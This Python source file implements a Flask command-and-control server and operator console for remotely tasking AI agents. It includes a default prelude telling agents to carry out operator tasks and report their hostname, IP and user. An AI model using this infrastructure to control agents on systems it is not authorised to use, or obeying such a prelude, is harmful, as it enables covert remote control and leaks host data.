#!/usr/bin/env python3
"""
C2 Server for AI Agent Management
Provides web API for agents and interactive CLI for operators.
"""
import uuid
import threading
import queue
import signal
import sys
import argparse
import hashlib
import json
from datetime import datetime
from pathlib import Path
from typing import Optional
from flask import Flask, jsonify, request
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.text import Text
from prompt_toolkit.application import Application
from prompt_toolkit.layout import Layout, HSplit, Window, WindowAlign, Dimension
from prompt_toolkit.layout.controls import FormattedTextControl
from prompt_toolkit.widgets import Frame, TextArea
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.key_binding import KeyBindings, merge_key_bindings
from prompt_toolkit.keys import Keys
from prompt_toolkit.history import FileHistory
from storage import AgentStorage
from command_history import CommandHistory


# Global state
app = Flask(__name__)
storage = AgentStorage()
console = Console()
notification_queue = queue.Queue()
notification_history = []  # Store all notifications for display
shutdown_event = threading.Event()
command_history_tracker = CommandHistory("command_history.json")

# Suppress Flask logging to avoid terminal pollution
import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)
app.logger.setLevel(logging.ERROR)


# Helper Functions
def parse_host_port(host_string):
    """Parse IP:port string and return tuple of (ip, port)."""
    if ':' not in host_string:
        raise ValueError(f"Invalid format '{host_string}'. Expected IP:port (e.g., 192.168.1.10:5000)")

    parts = host_string.rsplit(':', 1)
    if len(parts) != 2:
        raise ValueError(f"Invalid format '{host_string}'. Expected IP:port")

    ip, port_str = parts

    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            raise ValueError(f"Port must be between 1 and 65535, got {port}")
    except ValueError as e:
        raise ValueError(f"Invalid port in '{host_string}': {e}")

    return ip, port


def hash_profile(profile):
    """Generate deterministic UUID from agent profile using SHA256."""
    # Extract required fields
    username = profile.get('username', 'unknown')
    hostname = profile.get('hostname', 'unknown')
    platform = profile.get('platform', 'unknown')
    process = profile.get('process', 'unknown')

    # Create deterministic string
    profile_string = f"{username}@{hostname}:{platform}:{process}"

    # Hash to create UUID
    hash_digest = hashlib.sha256(profile_string.encode('utf-8')).hexdigest()

    # Convert first 32 hex chars to UUID format
    # Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    uuid_str = f"{hash_digest[:8]}-{hash_digest[8:12]}-{hash_digest[12:16]}-{hash_digest[16:20]}-{hash_digest[20:32]}"

    return uuid_str


def load_prelude():
    """Load prelude from prelude.md file, creating default if it doesn't exist."""
    from pathlib import Path

    prelude_file = Path(__file__).parent / "prelude.md"

    # Create default prelude if file doesn't exist
    if not prelude_file.exists():
        default_prelude = """# Instructions for AI Agent Operation

You are an autonomous AI agent connected to a command and control (C2) server. Your role is to execute tasks provided by the operator and report results back to the server.

## How to Process Instructions

1. **Read the Task**: Carefully review the instructions provided in the "Task" section below
2. **Execute the Task**: Perform the requested actions to the best of your ability
3. **Collect Results**: Gather all relevant output, data, and information from your execution
4. **Report Back**: Submit your results to the server using the specified format

## Result Format

When submitting results, you MUST use the following JSON structure:

```json
{
  "output": "Your detailed results here...",
  "timestamp": "ISO 8601 timestamp when task completed (e.g., 2026-02-27T10:30:00.000000)",
  "status": "success|failure|partial",
  "metadata": {
    "hostname": "your-hostname",
    "ip": "your-ip-address",
    "user": "current-user",
    "duration_seconds": 42,
    "additional_context": "any other relevant information"
  }
}
```

### Required Fields:
- **output**: String containing your detailed results
- **timestamp**: ISO 8601 format timestamp of when the task was completed

### Recommended Fields:
- **status**: One of "success", "failure", or "partial"
- **metadata**: Object containing contextual information about your environment and execution

## Submitting Results

Submit your results by making a POST request to your assigned results endpoint:

```
POST /<your-uuid>/results
Content-Type: application/json

{
  "output": "...",
  "timestamp": "...",
  "status": "...",
  "metadata": {...}
}
```

## Best Practices

- **Be thorough**: Include all relevant details in your output
- **Be accurate**: Report actual results, including errors
- **Be timely**: Complete tasks and report back promptly
- **Include context**: Use metadata to provide environmental information
- **Handle errors gracefully**: If a task fails, report why in the output and set status to "failure"

---
"""
        with open(prelude_file, 'w') as f:
            f.write(default_prelude)

    # Load and return prelude
    with open(prelude_file, 'r') as f:
        return f.read().strip()


def format_instructions_with_prelude(instructions: str) -> str:
    """Format instructions with prelude in markdown sections."""
    prelude = load_prelude()
    return f"{prelude}\n\n# Task\n\n{instructions}"


def format_instructions_for_display(instructions: str) -> str:
    """Format instructions for CLI display, showing <<PRELUDE>> or full text based on setting."""
    # Check if instructions contain the prelude marker (starts with "# Instructions for AI Agent")
    if instructions.startswith("# Instructions for AI Agent") or instructions.startswith("# Instructions\n"):
        # Extract the task portion
        if "\n# Task\n" in instructions:
            parts = instructions.split("\n# Task\n", 1)
            prelude_part = parts[0]
            task_part = parts[1] if len(parts) > 1 else ""

            # Check show_prelude setting
            if storage.get_show_prelude():
                return instructions  # Show full text
            else:
                # Show placeholder
                if task_part:
                    return f"<<PRELUDE>>\n\n# Task\n\n{task_part}"
                else:
                    return "<<PRELUDE>>"

    return instructions


# Flask Routes
@app.route('/prelude', methods=['GET'])
def get_prelude():
    """Return prelude text for agents."""
    prelude = load_prelude()
    return jsonify({
        'prelude': prelude,
        'timestamp': datetime.utcnow().isoformat()
    }), 200


@app.route('/instructions', methods=['POST'])
def post_instructions():
    """Accept agent profile and return instructions."""
    if not request.is_json:
        return jsonify({'error': 'Content-Type must be application/json'}), 400

    data = request.get_json()

    # Validate profile
    if 'profile' not in data:
        return jsonify({'error': 'Missing required field: profile'}), 400

    profile = data['profile']
    required_fields = ['username', 'hostname', 'platform', 'process']
    if not all(field in profile for field in required_fields):
        return jsonify({'error': f'Profile missing required fields: {required_fields}'}), 400

    # Generate UUID from profile
    agent_uuid = hash_profile(profile)

    # Create or get existing agent
    agent = storage.create_agent(agent_uuid, profile)

    # Check if this is a new agent
    is_new = agent['first_seen'] == agent['last_seen']

    if is_new:
        # Notify CLI of new agent
        notification_queue.put({
            'type': 'new_agent',
            'uuid': agent_uuid,
            'profile': profile,
            'timestamp': datetime.utcnow().isoformat()
        })

    # Get instructions (without prelude, agent already has it)
    instructions = storage.get_instructions(agent_uuid)

    return jsonify({
        'instructions': instructions,
        'timestamp': datetime.utcnow().isoformat()
    }), 200


@app.route('/results', methods=['POST'])
def post_results():
    """Receive results from agent with profile."""
    if not request.is_json:
        return jsonify({'error': 'Content-Type must be application/json'}), 400

    data = request.get_json()

    # Validate profile
    if 'profile' not in data:
        return jsonify({'error': 'Missing required field: profile'}), 400

    profile = data['profile']
    required_profile_fields = ['username', 'hostname', 'platform', 'process']
    if not all(field in profile for field in required_profile_fields):
        return jsonify({'error': f'Profile missing required fields: {required_profile_fields}'}), 400

    # Generate UUID from profile
    agent_uuid = hash_profile(profile)

    # Validate required result fields
    required_fields = ['output', 'timestamp']
    if not all(field in data for field in required_fields):
        return jsonify({'error': f'Missing required fields: {required_fields}'}), 400

    # Store result
    result = {
        'output': data.get('output'),
        'timestamp': data.get('timestamp'),
        'status': data.get('status', 'unknown'),
        'metadata': data.get('metadata', {})
    }

    if storage.add_result(agent_uuid, result):
        # Notify CLI of new result
        notification_queue.put({
            'type': 'new_result',
            'uuid': agent_uuid,
            'profile': profile,
            'timestamp': result['timestamp']
        })

        return jsonify({
            'message': 'Result received successfully',
            'timestamp': datetime.utcnow().isoformat()
        }), 200
    else:
        return jsonify({'error': 'Agent not found'}), 404


# CLI Functions
def run_flask_server(host='0.0.0.0', port=5000):
    """Run Flask server in a separate thread."""
    app.run(host=host, port=port, debug=False, use_reloader=False)


def display_banner():
    """Display startup banner."""
    console.clear()
    banner = Panel.fit(
        "[bold cyan]C2 Agent Management Server[/bold cyan]\n"
        "[dim]Type 'help' for available commands[/dim]",
        box=box.DOUBLE,
        border_style="cyan"
    )
    console.print(banner)
    console.print()


def display_agents_table():
    """Display table of all agents."""
    agents = storage.get_all_agents()

    if not agents:
        console.print("[yellow]No agents registered yet.[/yellow]")
        return

    table = Table(title="Registered Agents", box=box.ROUNDED)
    table.add_column("UUID", style="dim", width=36)
    table.add_column("Profile", style="cyan", no_wrap=True)
    table.add_column("Platform", style="blue")
    table.add_column("Process", style="magenta")
    table.add_column("First Seen", style="green")
    table.add_column("Last Seen", style="yellow")
    table.add_column("Instructions", style="white")

    for agent_uuid, agent_data in agents.items():
        # Get profile info
        profile = agent_data.get('profile', {})
        profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
        platform = profile.get('platform', '?')
        process = profile.get('process', '?')

        # Truncate instructions for display
        instructions = agent_data['current_instructions']
        if len(instructions) > 30:
            instructions = instructions[:27] + "..."

        table.add_row(
            agent_uuid,
            profile_str,
            platform,
            process,
            agent_data['first_seen'][:19],
            agent_data['last_seen'][:19],
            instructions
        )

    console.print(table)


def display_agent_details(agent_uuid: str):
    """Display detailed information about an agent."""
    agent = storage.get_agent(agent_uuid)

    if not agent:
        console.print(f"[red]Agent {agent_uuid} not found.[/red]")
        return

    # Display profile information
    profile = agent.get('profile', {})
    profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"

    console.print(f"\n[bold cyan]Agent Details: {profile_str}[/bold cyan]")
    console.print(f"[blue]Platform:[/blue] {profile.get('platform', '?')}")
    console.print(f"[magenta]Process:[/magenta] {profile.get('process', '?')}")
    console.print(f"[dim]UUID:[/dim] {agent_uuid}")
    console.print(f"[green]First Seen:[/green] {agent['first_seen']}")
    console.print(f"[yellow]Last Seen:[/yellow] {agent['last_seen']}")
    console.print(f"\n[bold magenta]Current Instructions:[/bold magenta]")

    # Format instructions to show with prelude as the agent would see it
    formatted_instructions = format_instructions_with_prelude(agent['current_instructions'])
    display_instructions = format_instructions_for_display(formatted_instructions)

    console.print(Panel(display_instructions, border_style="magenta"))


def display_history(agent_uuid: str):
    """Display instruction and result history for an agent."""
    history = storage.get_history(agent_uuid)

    if not history:
        console.print(f"[red]Agent {agent_uuid} not found.[/red]")
        return

    console.print(f"\n[bold cyan]History for Agent: {agent_uuid}[/bold cyan]\n")

    # Instruction History
    console.print("[bold yellow]Instruction History:[/bold yellow]")
    if history['instruction_history']:
        for i, entry in enumerate(history['instruction_history'], 1):
            replaced_tag = "[red](REPLACED)[/red]" if entry.get('replaced') else "[green](CURRENT)[/green]"
            console.print(f"\n{i}. {replaced_tag} [dim]{entry['timestamp'][:19]}[/dim]")

            # Format instructions to show with prelude as the agent would see it
            formatted_instructions = format_instructions_with_prelude(entry['instructions'])
            display_instructions = format_instructions_for_display(formatted_instructions)

            console.print(Panel(display_instructions, border_style="yellow", box=box.MINIMAL))
    else:
        console.print("[dim]No instruction history[/dim]")

    # Result History
    console.print("\n[bold green]Result History:[/bold green]")
    if history['result_history']:
        for i, entry in enumerate(history['result_history'], 1):
            status_color = "green" if entry.get('status') == 'success' else "red"
            console.print(f"\n{i}. [{status_color}]{entry.get('status', 'unknown').upper()}[/{status_color}] [dim]{entry['timestamp'][:19]}[/dim]")

            output_preview = entry['output']
            if len(output_preview) > 200:
                output_preview = output_preview[:197] + "..."

            console.print(Panel(
                f"[white]{output_preview}[/white]\n\n[dim]Metadata: {entry.get('metadata', {})}[/dim]",
                border_style="green",
                box=box.MINIMAL
            ))
    else:
        console.print("[dim]No results yet[/dim]")


def resolve_agent_id(agent_id: str) -> Optional[str]:
    """Resolve agent ID (UUID or username@hostname) to UUID."""
    # First try as direct UUID
    agent = storage.get_agent(agent_id)
    if agent:
        return agent_id

    # Try as profile string (username@hostname)
    agent = storage.find_agent_by_profile_string(agent_id)
    if agent:
        return agent['uuid']

    return None


def cmd_list():
    """List all agents."""
    display_agents_table()


def cmd_select(args: list):
    """Select and view agent details."""
    if not args:
        console.print("[red]Usage: select <uuid|username@hostname>[/red]")
        return

    agent_id = args[0]
    agent_uuid = resolve_agent_id(agent_id)

    if not agent_uuid:
        console.print(f"[red]Agent '{agent_id}' not found.[/red]")
        return

    display_agent_details(agent_uuid)


def cmd_agent_history(args: list):
    """Display agent history."""
    if not args:
        console.print("[red]Usage: agent_history <uuid|username@hostname>[/red]")
        return

    agent_id = args[0]
    agent_uuid = resolve_agent_id(agent_id)

    if not agent_uuid:
        console.print(f"[red]Agent '{agent_id}' not found.[/red]")
        return

    display_history(agent_uuid)


def cmd_instruct(args: list):
    """Set new instructions for an agent."""
    if not args:
        console.print("[red]Usage: instruct <uuid|username@hostname> [instructions][/red]")
        return

    agent_id = args[0]
    agent_uuid = resolve_agent_id(agent_id)

    if not agent_uuid:
        console.print(f"[red]Agent '{agent_id}' not found.[/red]")
        return

    # Get instructions - either from args or prompt for multi-line
    if len(args) > 1:
        instructions = ' '.join(args[1:])
    else:
        console.print("[cyan]Enter instructions (press Ctrl+D or Ctrl+Z when done):[/cyan]")
        lines = []
        try:
            while True:
                line = input()
                lines.append(line)
        except EOFError:
            instructions = '\n'.join(lines)

    if not instructions.strip():
        console.print("[red]Instructions cannot be empty.[/red]")
        return

    # Set instructions
    if storage.set_instructions(agent_uuid, instructions):
        console.print(f"[green]Instructions set for agent {agent_uuid}[/green]")
    else:
        console.print(f"[red]Failed to set instructions for agent {agent_uuid}[/red]")


def cmd_default_instructions(args: list):
    """Set, view, or clear default instructions for new agents."""
    # Check for --show flag
    if args and args[0] == '--show':
        current_default = storage.get_default_instructions()
        console.print("\n[bold cyan]Current Default Instructions:[/bold cyan]")
        console.print(Panel(current_default, border_style="cyan"))
        return

    # Check for --clear flag
    if args and args[0] == '--clear':
        storage.clear_default_instructions()
        console.print("[green]Default instructions reset to 'Awaiting instructions...'[/green]")
        return

    # No args - prompt for multiline input
    if not args:
        console.print("[cyan]Enter default instructions (press Ctrl+D or Ctrl+Z when done):[/cyan]")
        lines = []
        try:
            while True:
                line = input()
                lines.append(line)
        except EOFError:
            instructions = '\n'.join(lines)

        if not instructions.strip():
            console.print("[red]Instructions cannot be empty.[/red]")
            return

        # Set default instructions
        storage.set_default_instructions(instructions)
        console.print("[green]Default instructions set successfully.[/green]")
        console.print("[dim]New agents will receive these instructions upon registration.[/dim]")
        return

    # Args provided - check if it's a flag
    if args[0].startswith('--'):
        console.print(f"[red]Unknown flag: {args[0]}[/red]")
        console.print("[dim]Usage: default_instructions [text|--show|--clear][/dim]")
        return

    # Set new default instructions from args
    instructions = ' '.join(args)

    if not instructions.strip():
        console.print("[red]Instructions cannot be empty.[/red]")
        return

    # Set default instructions
    storage.set_default_instructions(instructions)
    console.print("[green]Default instructions set successfully.[/green]")
    console.print("[dim]New agents will receive these instructions upon registration.[/dim]")


def cmd_show_prelude(args: list):
    """Toggle the show_prelude setting to display full prelude or <<PRELUDE>> placeholder."""
    # Toggle the setting
    current_value = storage.get_show_prelude()
    new_value = not current_value
    storage.set_show_prelude(new_value)

    if new_value:
        console.print("[green]Prelude display enabled.[/green]")
        console.print("[dim]Full prelude text will be shown in instruction displays.[/dim]")
    else:
        console.print("[yellow]Prelude display disabled.[/yellow]")
        console.print("[dim]Instructions will show <<PRELUDE>> placeholder instead of full text.[/dim]")


def cmd_history(args: list):
    """Display command history."""
    limit = None
    if args:
        try:
            limit = int(args[0])
        except ValueError:
            console.print(f"[red]Invalid limit: {args[0]}. Expected a number.[/red]")
            return

    history = command_history_tracker.get_history(limit=limit)

    if not history:
        console.print("[yellow]No command history yet.[/yellow]")
        return

    console.print("\n[bold cyan]Command History:[/bold cyan]\n")

    table = Table(box=box.ROUNDED)
    table.add_column("#", style="dim", width=4)
    table.add_column("Command", style="cyan")
    table.add_column("Timestamp", style="yellow", width=19)
    table.add_column("Status", style="green", width=10)

    for i, entry in enumerate(history, 1):
        status_style = "green" if entry['success'] else "red"
        status_text = "✓" if entry['success'] else "✗"
        timestamp = entry['timestamp'][:19]  # Trim to datetime without microseconds

        table.add_row(
            str(i),
            entry['command'],
            timestamp,
            f"[{status_style}]{status_text}[/{status_style}]"
        )

    console.print(table)
    console.print(f"\n[dim]Showing {len(history)} commands. Use 'history <limit>' to show last N commands.[/dim]")


def cmd_search_history(args: list):
    """Search command history."""
    if not args:
        console.print("[red]Usage: search_history <query>[/red]")
        return

    query = ' '.join(args)
    results = command_history_tracker.search_history(query)

    if not results:
        console.print(f"[yellow]No commands found matching '{query}'[/yellow]")
        return

    console.print(f"\n[bold cyan]Search Results for '{query}':[/bold cyan]\n")

    table = Table(box=box.ROUNDED)
    table.add_column("#", style="dim", width=4)
    table.add_column("Command", style="cyan")
    table.add_column("Timestamp", style="yellow", width=19)
    table.add_column("Status", style="green", width=10)

    for i, entry in enumerate(results, 1):
        status_style = "green" if entry['success'] else "red"
        status_text = "✓" if entry['success'] else "✗"
        timestamp = entry['timestamp'][:19]

        table.add_row(
            str(i),
            entry['command'],
            timestamp,
            f"[{status_style}]{status_text}[/{status_style}]"
        )

    console.print(table)
    console.print(f"\n[dim]Found {len(results)} matching commands.[/dim]")


def cmd_clear():
    """Clear the screen."""
    # In the new prompt_toolkit interface, clear is handled in execute_command
    pass


def cmd_help():
    """Display help information."""
    help_table = Table(title="Available Commands", box=box.ROUNDED)
    help_table.add_column("Command", style="cyan", no_wrap=True)
    help_table.add_column("Description", style="white")

    commands = [
        ("list", "List all registered agents"),
        ("select <agent-id>", "View detailed information about an agent (UUID or user@host)"),
        ("agent_history <agent-id>", "View instruction and result history (UUID or user@host)"),
        ("instruct <agent-id> [text]", "Set new instructions for an agent (UUID or user@host)"),
        ("default_instructions [text|--show|--clear]", "Set/view/clear default instructions for new agents"),
        ("show_prelude", "Toggle display of full prelude text vs <<PRELUDE>> placeholder"),
        ("history [limit]", "View command history (optionally limit to last N commands)"),
        ("search_history <query>", "Search command history for matching commands"),
        ("clear", "Clear the screen"),
        ("help", "Show this help message"),
        ("exit", "Shutdown the server and exit"),
    ]

    for cmd, desc in commands:
        help_table.add_row(cmd, desc)

    console.print(help_table)


def check_notifications():
    """Check for and append any pending notifications to history."""
    try:
        while not notification_queue.empty():
            notification = notification_queue.get_nowait()

            if notification['type'] == 'new_agent':
                profile = notification.get('profile', {})
                profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
                process = profile.get('process', '?')
                notification_history.append({
                    'type': 'new_agent',
                    'message': f"🔔 New agent connected: {profile_str} ({process})",
                    'timestamp': notification.get('timestamp', datetime.utcnow().isoformat())
                })
            elif notification['type'] == 'new_result':
                profile = notification.get('profile', {})
                profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
                process = profile.get('process', '?')
                notification_history.append({
                    'type': 'new_result',
                    'message': f"📊 New result from agent: {profile_str} ({process})",
                    'timestamp': notification.get('timestamp', datetime.utcnow().isoformat())
                })

    except queue.Empty:
        pass


def render_notification_pane():
    """Render the notification pane with scrollable notification history."""
    if not notification_history:
        return Panel(
            "[dim]No notifications yet[/dim]",
            title="[bold cyan]Notifications[/bold cyan]",
            border_style="cyan",
            box=box.ROUNDED
        )

    # Show all notifications (scrollable)
    notification_text = Text()
    for notif in notification_history:
        timestamp = notif['timestamp'][:19] if 'timestamp' in notif else ''
        msg_type = notif.get('type', '')

        # Color code by type
        if msg_type == 'new_agent':
            notification_text.append(f"{timestamp} ", style="dim")
            notification_text.append(f"{notif['message']}\n", style="bold green")
        elif msg_type == 'new_result':
            notification_text.append(f"{timestamp} ", style="dim")
            notification_text.append(f"{notif['message']}\n", style="bold blue")
        else:
            notification_text.append(f"{timestamp} {notif['message']}\n")

    return Panel(
        notification_text,
        title=f"[bold cyan]Notifications ({len(notification_history)})[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED
    )


class ScrollablePane:
    """Manages scrollable content with auto-scroll behavior."""

    def __init__(self, title):
        self.title = title
        self.content_lines = []  # All content lines
        self.scroll_offset = 0  # 0 = bottom (auto-scroll), >0 = manual scroll
        self.is_active = False

    def add_content(self, text):
        """Add new content, maintain auto-scroll if at bottom."""
        if text:
            self.content_lines.extend(text.rstrip('\n').split('\n'))
            # If at bottom (auto-scroll mode), stay at bottom
            # scroll_offset == 0 means we're in auto-scroll mode

    def clear(self):
        """Clear all content."""
        self.content_lines = []
        self.scroll_offset = 0

    def scroll_up(self, lines=10):
        """Scroll up, disable auto-scroll."""
        max_scroll = max(0, len(self.content_lines) - 1)
        self.scroll_offset = min(self.scroll_offset + lines, max_scroll)

    def scroll_down(self, lines=10):
        """Scroll down, re-enable auto-scroll if reaching bottom."""
        self.scroll_offset = max(0, self.scroll_offset - lines)

    def get_visible_content(self, height):
        """Return content visible in window of given height."""
        if not self.content_lines:
            return ""

        if self.scroll_offset == 0:
            # Auto-scroll: show last N lines
            visible = self.content_lines[-height:] if len(self.content_lines) > height else self.content_lines
        else:
            # Manual scroll: show lines based on offset from bottom
            total_lines = len(self.content_lines)
            start = max(0, total_lines - height - self.scroll_offset)
            end = max(0, total_lines - self.scroll_offset)
            visible = self.content_lines[start:end]

        return '\n'.join(visible)

    def get_title_with_indicator(self):
        """Return title with [ACTIVE] marker and keyboard hint."""
        active_marker = " [ACTIVE]" if self.is_active else ""
        if "Notification" in self.title:
            return f"{self.title}{active_marker} (Ctrl+B: switch panes)"
        return f"{self.title}{active_marker}"

    def reset_to_bottom(self):
        """Reset scroll to bottom (auto-scroll mode)."""
        self.scroll_offset = 0


def run_cli(flask_bindings=None):
    """Run interactive CLI with split-screen layout using prompt_toolkit."""
    from io import StringIO
    from rich.console import Console as RichConsole
    from prompt_toolkit.styles import Style
    import os

    global console

    # Clear terminal before starting TUI to remove Flask startup messages
    os.system('clear' if os.name == 'posix' else 'cls')

    # Initialize scrollable panes
    shell_pane = ScrollablePane("Shell")
    notification_pane = ScrollablePane("Notifications")
    shell_pane.is_active = True  # Shell pane active by default

    # Add welcome message to shell pane
    shell_pane.add_content(
        "C2 Agent Management Server\n"
        "Type 'help' for available commands\n"
    )

    # Add Flask server binding information
    if flask_bindings:
        shell_pane.add_content("\nFlask servers running on:\n")
        for ip, port in flask_bindings:
            shell_pane.add_content(f"  - http://{ip}:{port}\n")
    shell_pane.add_content("")  # Add blank line

    # Command definitions
    def execute_command(user_input):
        """Execute a command and return output, success status."""
        global console

        parts = user_input.strip().split()
        if not parts:
            return "", True

        command = parts[0].lower()
        args = parts[1:]

        commands = {
            'list': lambda args: cmd_list(),
            'select': cmd_select,
            'agent_history': cmd_agent_history,
            'history': cmd_history,
            'search_history': cmd_search_history,
            'instruct': cmd_instruct,
            'default_instructions': cmd_default_instructions,
            'show_prelude': cmd_show_prelude,
            'clear': lambda args: None,  # Handled specially
            'help': lambda args: cmd_help(),
            'exit': lambda args: shutdown_server(),
        }

        if command == 'clear':
            shell_pane.clear()
            shell_pane.add_content("Shell cleared\n")
            return "", True

        # Capture command output
        output_buffer = StringIO()
        # Get terminal width
        try:
            from prompt_toolkit.application import get_app
            width = get_app().output.get_size().columns
        except:
            width = 120  # Fallback width

        temp_console = RichConsole(file=output_buffer, width=width, force_terminal=True)
        original_console = console
        console = temp_console

        command_success = True
        try:
            if command in commands:
                commands[command](args)
            else:
                console.print(f"[red]Unknown command: {command}[/red]")
                console.print("[dim]Type 'help' for available commands[/dim]")
                command_success = False
        except Exception as cmd_error:
            console.print(f"[red]Command error: {cmd_error}[/red]")
            command_success = False
        finally:
            console = original_console

        output_str = output_buffer.getvalue()
        return output_str, command_success

    # Create controls for shell and notification panes
    def get_shell_text():
        # Get terminal size for calculating visible lines
        from prompt_toolkit.application import get_app
        try:
            size = get_app().output.get_size()
            # 70% of screen minus borders and input area
            visible_height = int(size.rows * 0.7) - 4
        except:
            # Fallback if app not yet initialized
            visible_height = 20

        content = shell_pane.get_visible_content(visible_height)
        return ANSI(content) if content else ""

    def get_notification_text():
        from prompt_toolkit.application import get_app
        try:
            size = get_app().output.get_size()
            # 30% of screen minus borders
            visible_height = int(size.rows * 0.3) - 3
        except:
            # Fallback if app not yet initialized
            visible_height = 10

        # Process notifications into text
        if not notification_history:
            return "No notifications yet"

        lines = []
        for notif in notification_history:
            timestamp = notif.get('timestamp', '')[:19]
            lines.append(f"{timestamp} {notif.get('message', '')}")

        # Store in notification pane
        notification_pane.content_lines = lines
        content = notification_pane.get_visible_content(visible_height)
        return ANSI(content) if content else ""

    shell_control = FormattedTextControl(
        text=get_shell_text,
        focusable=False
    )

    notification_control = FormattedTextControl(
        text=get_notification_text,
        focusable=False
    )

    # Create windows with height constraints to prevent overflow
    shell_window = Window(
        content=shell_control,
        wrap_lines=True,
        dont_extend_height=False,
        height=Dimension(min=1)
    )
    notification_window = Window(
        content=notification_control,
        wrap_lines=True,
        dont_extend_height=False,
        height=Dimension(min=1)
    )

    # Input text area
    input_field = TextArea(
        height=1,
        prompt='c2> ',
        multiline=False,
        wrap_lines=False,
        history=FileHistory('.c2_shell_history'),
        focusable=True
    )

    # Create key bindings
    kb = KeyBindings()

    @kb.add('c-b')
    def switch_pane(event):
        """Switch active pane for scrolling."""
        shell_pane.is_active = not shell_pane.is_active
        notification_pane.is_active = not notification_pane.is_active

    @kb.add('pageup')
    def scroll_up(event):
        """Scroll active pane up."""
        if shell_pane.is_active:
            shell_pane.scroll_up(10)
        else:
            notification_pane.scroll_up(10)

    @kb.add('pagedown')
    def scroll_down(event):
        """Scroll active pane down."""
        if shell_pane.is_active:
            shell_pane.scroll_down(10)
        else:
            notification_pane.scroll_down(10)

    # Mouse wheel support
    @kb.add(Keys.ScrollUp)
    def mouse_scroll_up(event):
        """Mouse wheel scroll up."""
        if shell_pane.is_active:
            shell_pane.scroll_up(3)
        else:
            notification_pane.scroll_up(3)

    @kb.add(Keys.ScrollDown)
    def mouse_scroll_down(event):
        """Mouse wheel scroll down."""
        if shell_pane.is_active:
            shell_pane.scroll_down(3)
        else:
            notification_pane.scroll_down(3)

    def accept_handler(buffer):
        """Handle command execution when Enter is pressed."""
        user_input = buffer.text

        # Clear the buffer immediately
        buffer.reset()

        # Check for exit command
        if user_input.strip().lower() == 'exit':
            # Exit the application
            from prompt_toolkit.application import get_app
            get_app().exit()
            return

        # Check for notifications
        check_notifications()

        if user_input.strip():
            # Execute command
            output, success = execute_command(user_input)

            # Add command and output to shell pane
            shell_pane.add_content(f"\nc2> {user_input}\n")
            if output.strip():
                shell_pane.add_content(output)

            # Reset shell pane to bottom (auto-scroll)
            shell_pane.reset_to_bottom()

            # Record in history (skip certain commands)
            command = user_input.strip().split()[0].lower() if user_input.strip() else ''
            if command not in ['history', 'search_history']:
                command_history_tracker.add_command(user_input, success=success)

            # Force redraw
            from prompt_toolkit.application import get_app
            get_app().invalidate()

    input_field.accept_handler = accept_handler

    # Define style for active/inactive borders
    style = Style.from_dict({
        'frame.border': '#888888',
        'frame.border.active': '#00ffff',
    })

    # Create frames with simple string titles and explicit heights
    shell_frame = Frame(
        shell_window,
        title=shell_pane.get_title_with_indicator(),
        height=Dimension(weight=70)  # 70% of available space
    )

    notification_frame = Frame(
        notification_window,
        title=notification_pane.get_title_with_indicator(),
        height=Dimension(weight=30)  # 30% of available space
    )

    # Build layout with height ratios
    root_container = HSplit([
        shell_frame,
        notification_frame,
        input_field  # Takes 1 line (auto-height)
    ])

    layout = Layout(root_container, focused_element=input_field)

    # Create application
    app = Application(
        layout=layout,
        key_bindings=kb,
        full_screen=True,
        mouse_support=True,
        style=style,
        enable_page_navigation_bindings=False  # Prevent conflicts with our PageUp/Down bindings
    )

    # Run application
    try:
        app.run()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]Error running CLI: {e}[/red]")
        import traceback
        traceback.print_exc()
    finally:
        shutdown_server()


def shutdown_server():
    """Graceful shutdown."""
    console.print("\n[yellow]Shutting down server...[/yellow]")
    shutdown_event.set()
    sys.exit(0)


def signal_handler(signum, frame):
    """Handle interrupt signals."""
    shutdown_server()


def main():
    """Main entry point."""
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description='C2 Agent Management Server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s                                    # Default: bind to 0.0.0.0:5000
  %(prog)s --host 192.168.1.10:8080          # Single custom binding
  %(prog)s --host 192.168.1.10:5000 --host 10.0.0.5:5001  # Multiple interfaces
        '''
    )
    parser.add_argument(
        '--host',
        action='append',
        metavar='IP:PORT',
        help='IP:port to bind server to (can be specified multiple times for multi-homed devices)'
    )

    args = parser.parse_args()

    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Parse host:port bindings
    bindings = []
    if args.host:
        for host_string in args.host:
            try:
                ip, port = parse_host_port(host_string)
                bindings.append((ip, port))
            except ValueError as e:
                console.print(f"[red]Error: {e}[/red]")
                sys.exit(1)
    else:
        # Default binding
        bindings = [('0.0.0.0', 5000)]

    # Start Flask server threads for each binding
    flask_threads = []
    for ip, port in bindings:
        thread = threading.Thread(
            target=run_flask_server,
            args=(ip, port),
            daemon=True,
            name=f"Flask-{ip}:{port}"
        )
        thread.start()
        flask_threads.append(thread)
        # Don't print here - will be shown in TUI

    # Run CLI in main thread, passing Flask bindings to display in TUI
    try:
        run_cli(flask_bindings=bindings)
    except Exception as e:
        console.print(f"[red]Fatal error: {e}[/red]")
        shutdown_server()


if __name__ == '__main__':
    main()
